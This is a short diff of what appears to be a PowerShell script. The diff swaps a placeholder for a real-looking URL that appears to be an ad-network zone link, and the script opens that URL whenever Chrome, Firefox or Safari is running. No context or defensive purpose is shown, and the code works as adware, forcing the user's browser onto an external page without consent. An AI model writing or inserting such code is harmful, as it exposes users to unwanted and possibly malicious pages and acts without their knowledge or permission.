@@ -1,4 +1,4 @@
-$site="https://uwhef.fojewifj/wuhgfuhweif";
+$site="http://deloplen.com/afu.php?zoneid=2364459";
 if (get-process "Chrome") { Start $site } 
 elseif (get-process "Firefox") { Start $site } 
 elseif (get-process "Safari") { Start $site } 
